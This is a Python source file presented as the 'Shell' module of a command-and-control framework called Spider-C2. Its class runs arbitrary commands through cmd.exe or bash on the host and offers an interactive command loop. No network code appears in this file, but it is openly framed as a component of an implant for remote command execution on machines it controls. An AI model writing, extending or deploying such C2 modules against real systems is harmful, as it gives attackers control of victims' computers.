"""
Spider-C2 Module : Shell
Remote command execution.
"""

import subprocess
import platform

class ShellModule:
    def __init__(self):
        self.os_type = platform.system()

    def execute(self, command):
        try:
            if self.os_type == "Windows":
                result = subprocess.run(
                    ["cmd.exe", "/c", command],
                    capture_output=True, text=True, timeout=30
                )
            else:
                result = subprocess.run(
                    ["/bin/bash", "-c", command],
                    capture_output=True, text=True, timeout=30
                )
            output = result.stdout.strip() or result.stderr.strip()
            return output if output else "[+] Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[!] Command timed out"
        except Exception as e:
            return f"[!] Error: {e}"

    def interactive(self):
        print("[*] Interactive shell started. Type 'exit' to quit.")
        while True:
            try:
                cmd = input(f"{self.os_type}> ")
                if cmd.lower() == "exit":
                    break
                print(self.execute(cmd))
            except KeyboardInterrupt:
                break
        print("[*] Shell closed.")
